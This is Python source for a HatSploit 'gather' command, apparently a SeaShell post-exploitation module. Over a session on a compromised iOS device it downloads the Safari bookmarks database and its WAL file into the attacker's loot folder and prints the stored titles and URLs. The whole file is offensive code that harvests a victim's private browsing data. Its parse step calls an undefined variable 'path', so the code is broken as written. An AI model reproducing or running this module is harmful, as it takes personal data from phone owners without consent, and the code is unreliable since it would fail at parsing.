"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.lib.loot import Loot

from pex.db import DB

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "safari_bookmarks",
            'Authors': [
                'Ivan Nikolsky (enty8080) - command developer'
            ],
            'Description': "View Safari bookmarks.",
            'Usage': "safari_bookmarks",
            'MinArgs': 0
        }

        self.db = DB()

        self.db_file = '/private/var/mobile/Library/Safari/Bookmarks.db'
        self.wal_file = '/private/var/mobile/Library/Safari/Bookmarks.db-wal'

    def run(self, argc, argv):
        if not self.session.download(
                self.db_file, Loot().specific_loot('Bookmarks.db')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('Bookmarks.db-wal')):
            return

        self.print_process("Parsing bookmarks database...")

        try:
            bookmarks = self.db.parse_safari_bookmarks(path)
        except Exception:
            self.print_error("Failed to parse bookmarks database!")
            return

        bookmarks_data = []
        for item in bookmarks:
            bookmarks_data.append((item['title'], item['url']))

        if bookmarks_data:
            self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
        else:
            self.print_warning("No bookmarks available on device.")
